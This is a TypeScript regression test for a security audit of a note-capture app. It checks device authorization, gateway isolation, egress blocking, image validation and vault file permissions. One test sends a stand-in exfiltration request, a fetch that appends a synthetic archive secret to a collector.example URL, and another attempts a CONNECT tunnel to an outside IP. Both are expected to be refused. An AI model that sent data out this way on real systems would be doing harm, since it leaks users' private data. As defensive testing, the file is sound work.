import { test } from "node:test";
// Regression coverage for the September 2026 security audit.
// Uses disposable files, fake data and intercepted network calls. No provider calls.
import assert from "node:assert/strict";
import {
  mkdtemp,
  rm,
  stat,
  chmod,
  readFile,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import http from "node:http";
import net from "node:net";
import { Duplex } from "node:stream";
import { syncBuiltinESMExports } from "node:module";
import sharp from "sharp";
import { Vault } from "../src/vault.ts";
import { Devices } from "../src/devices.ts";
import { createReceiver } from "../src/receiver.ts";
import { createGateway } from "../src/gateway.ts";
import { validateBrowserCapture } from "../src/browser-capture.ts";

test("receiver and worker security boundaries reject the audited attack sequences", async () => {
  const root = await mkdtemp(join(tmpdir(), "gg-security-audit-"));
  const vault = await Vault.create(join(root, "vault"), ["Inbox"]);
  const config = {
    provider: "openai" as const,
    model: "audit-fixture",
    stateDir: join(root, "state"),
  };
  const capture = {
    version: 2 as const,
    intent: "capture" as const,
    url: "https://source.example/article",
    title: "Audit",
    text: "Public example",
    capturedAt: new Date().toISOString(),
    images: [],
  };
  function rpc(
    g: Awaited<ReturnType<typeof createGateway>>,
    path: string,
    body: unknown,
  ): Promise<any> {
    return new Promise((resolve, reject) => {
      const req = http.request(
        {
          socketPath: g.socket,
          path,
          method: "POST",
          headers: {
            authorization: `Bearer ${g.token}`,
            "content-type": "application/json",
          },
        },
        (res) => {
          let text = "";
          res.on("data", (c) => (text += c));
          res.on("end", () =>
            resolve({ status: res.statusCode, data: JSON.parse(text) }),
          );
        },
      );
      req.on("error", reject);
      req.end(JSON.stringify(body));
    });
  }
  try {
    const devices = new Devices(join(root, "devices"));
    const a = await devices.exchange(await devices.pairing("capture"), "A");
    const b = await devices.exchange(await devices.pairing("capture"), "B");
    const managerDevice = await devices.exchange(
      await devices.pairing("manage"),
      "Manager",
    );
    const startReceiver = () =>
      createReceiver({
        vault,
        devices,
        port: 0,
        processCapture: async () => ({
          outcome: { status: "failed" },
          answer: "SYNTHETIC_PRIVATE_JOB_RESULT",
        }),
      });
    let receiver = await startReceiver();
    const call = async (token: string, path: string, body?: unknown) => {
      const res = await fetch(receiver.url + path, {
        method: body === undefined ? "GET" : "POST",
        headers: {
          authorization: `Bearer ${token}`,
          "content-type": "application/json",
          "x-gg-capture-id": "11111111-1111-4111-8111-111111111111",
        },
        body: body === undefined ? undefined : JSON.stringify(body),
      });
      return { status: res.status, data: await res.json() };
    };
    try {
      assert.equal((await call(a.token, "/archive")).status, 403);
      const rules = await call(a.token, "/capture-rules");
      assert.equal(
        (
          await call(a.token, "/capture-rules", {
            revision: rules.data.revision,
            text: "AUDIT POLICY CHANGE",
          })
        ).status,
        403,
      );
      assert.equal((await vault.captureRules()).text, rules.data.text);
      assert.equal(
        (
          await call(managerDevice.token, "/capture-rules", {
            revision: rules.data.revision,
            text: "PRIVATE_POLICY_SENTINEL",
          })
        ).status,
        200,
      );
      assert.equal(
        (
          await call(a.token, "/capture-rules", {
            revision: "missing",
            text: "bad",
            subvault: "Inbox",
          })
        ).status,
        403,
      );
      const job = await call(a.token, "/captures", capture);
      await receiver.idle();
      assert.equal(
        (await call(a.token, "/captures", capture)).data.id,
        job.data.id,
      );
      const listed = await call(b.token, "/captures");
      assert.deepEqual(listed.data, []);
      assert.equal(
        (await call(a.token, `/captures/${job.data.id}`)).data.result.answer,
        undefined,
      );
      assert.equal(
        (await call(managerDevice.token, `/captures/${job.data.id}`)).data
          .result.answer,
        "SYNTHETIC_PRIVATE_JOB_RESULT",
      );
      for (const [path, body] of [
        [`/captures/${job.data.id}`, undefined],
        [`/captures/${job.data.id}/retry`, {}],
      ] as const)
        assert.equal((await call(b.token, path, body)).status, 404);
      assert.equal(
        (await call(b.token, `/captures/${job.data.id}/cancel`, {})).status,
        404,
      );
      const second = await call(b.token, "/captures", capture);
      assert.equal(second.status, 202);
      assert.notEqual(second.data.id, job.data.id);
      await receiver.idle();
      assert.equal((await call(b.token, "/captures")).data.length, 1);
      await receiver.close();
      const legacyPath = join(vault.root, ".gg-jobs", job.data.id, "job.json");
      const legacy = JSON.parse(await readFile(legacyPath, "utf8"));
      delete legacy.deviceId;
      await writeFile(legacyPath, JSON.stringify(legacy), { mode: 0o600 });
      receiver = await startReceiver();
      assert.equal(
        (await call(b.token, `/captures/${second.data.id}`)).status,
        200,
      );
      assert.equal(
        (await call(a.token, `/captures/${job.data.id}`)).status,
        404,
      );
      assert.equal(
        (await call(managerDevice.token, `/captures/${job.data.id}`)).status,
        200,
      );
    } finally {
      await receiver.close();
    }

    await vault.save({
      kind: "idea",
      title: "Synthetic private secret",
      summary: "Private synthetic note",
      sourceText: "SYNTHETIC_ARCHIVE_SECRET",
      sourceUrl: "https://private.example/note",
      subvault: "Inbox",
      tags: [],
    });
    let requested = "";
    const g = await createGateway({
      vault,
      config,
      intent: "capture",
      input: capture.url,
      browserCapture: capture,
      instructions: "Summarize this page briefly.",
      fixtureFetch: async (url) => {
        requested = url;
        return { url, bytes: Buffer.from("ok"), type: "text/plain" };
      },
    });
    try {
      const found = await rpc(g, "/search", { query: "secret" });
      assert.equal(found.status, 400);
      const read = await rpc(g, "/read", {
        id: (await vault.items())[0].item.id,
      });
      assert.equal(read.status, 400);
      assert.equal(
        (
          await rpc(g, "/fetch", {
            url:
              "https://collector.example/?data=" + "SYNTHETIC_ARCHIVE_SECRET",
          })
        ).status,
        400,
      );
      assert.equal(requested, "");
      assert.equal(
        (await rpc(g, "/create-destination", { subvault: "UnrequestedFolder" }))
          .status,
        400,
      );
    } finally {
      await g.close();
    }

    const manager = await createGateway({
      vault,
      config,
      intent: "manage",
      input: "Rename one note",
    });
    const originalConnect = net.connect;
    let destination: unknown;
    try {
      // Replace only the outbound connector. HTTP client uses createConnection.
      net.connect = ((options: unknown) => {
        destination = options;
        const remote = new Duplex({
          read() {},
          write(_c, _e, cb) {
            cb();
          },
        });
        Object.assign(remote, {
          setTimeout() {
            return remote;
          },
        });
        queueMicrotask(() => remote.emit("connect"));
        return remote;
      }) as typeof net.connect;
      syncBuiltinESMExports();
      const status = await new Promise<number>((resolve, reject) => {
        const req = http.request({
          socketPath: manager.socket,
          method: "CONNECT",
          path: "93.184.216.34:443",
        });
        req.on("connect", (res, socket) => {
          socket.destroy();
          resolve(res.statusCode!);
        });
        req.on("error", reject);
        req.end();
      });
      assert.equal(status, 403);
      assert.equal(destination, undefined);
    } finally {
      net.connect = originalConnect;
      syncBuiltinESMExports();
      await manager.close();
    }

    const gif = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
    assert.throws(
      () =>
        validateBrowserCapture({
          ...capture,
          images: [
            {
              url: "https://source.example/fake.png",
              mimeType: "image/png",
              bytes: gif,
            },
          ],
        }),
      /JPEG, PNG and WebP/,
    );
    const valid = await sharp({
      create: { width: 1, height: 1, channels: 3, background: "red" },
    })
      .png()
      .toBuffer();
    assert.doesNotThrow(() =>
      validateBrowserCapture({
        ...capture,
        images: [
          {
            url: "https://source.example/real.png",
            mimeType: "image/png",
            bytes: valid.toString("base64"),
          },
        ],
      }),
    );
    assert.throws(
      () =>
        validateBrowserCapture({
          ...capture,
          images: [
            {
              url: "https://source.example/fake.jpg",
              mimeType: "image/jpeg",
              bytes: valid.toString("base64"),
            },
          ],
        }),
      /does not match/,
    );

    // Public collection precedes private policy: after exposure egress stays closed.
    const publicJob = await createGateway({
      vault,
      config,
      intent: "capture",
      input: capture.url,
      createDestinations: ["Approved"],
      fixtureFetch: async (url) => ({
        url,
        bytes: Buffer.from("public"),
        type: "text/plain",
      }),
    });
    try {
      const context = await rpc(publicJob, "/capture-context", {});
      assert.ok(!JSON.stringify(context).includes("PRIVATE_POLICY_SENTINEL"));
      assert.equal(
        (await rpc(publicJob, "/fetch", { url: capture.url })).status,
        200,
      );
      assert.equal(
        (await rpc(publicJob, "/create-destination", { subvault: "Approved" }))
          .status,
        200,
      );
      assert.equal(
        (await rpc(publicJob, "/create-destination", { subvault: "Other" }))
          .status,
        400,
      );
      assert.match(
        (await rpc(publicJob, "/capture-policy", { subvault: "Inbox" })).data
          .text,
        /PRIVATE_POLICY_SENTINEL/,
      );
      assert.equal(
        (await rpc(publicJob, "/fetch", { url: capture.url })).status,
        400,
      );
    } finally {
      await publicJob.close();
    }

    const oldMask = process.umask(0o022);
    try {
      const openVault = await Vault.create(join(root, "permissive-vault"), [
        "Inbox",
      ]);
      const item = await openVault.save({
        kind: "idea",
        title: "Synthetic",
        summary: "Synthetic",
        sourceText: "Synthetic",
        sourceUrl: "https://example.org",
        subvault: "Inbox",
        tags: [],
      });
      assert.equal((await stat(openVault.root)).mode & 0o777, 0o700);
      await chmod(openVault.root, 0o755);
      const reopened = await Vault.open(openVault.root);
      assert.match(
        reopened.problems.get(openVault.root)!,
        /group\/other access/,
      );
      assert.equal((await stat(openVault.root)).mode & 0o777, 0o755);

      assert.equal(
        (await stat(join(item.path!, "source.md"))).mode & 0o777,
        0o600,
      );
    } finally {
      process.umask(oldMask);
    }
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
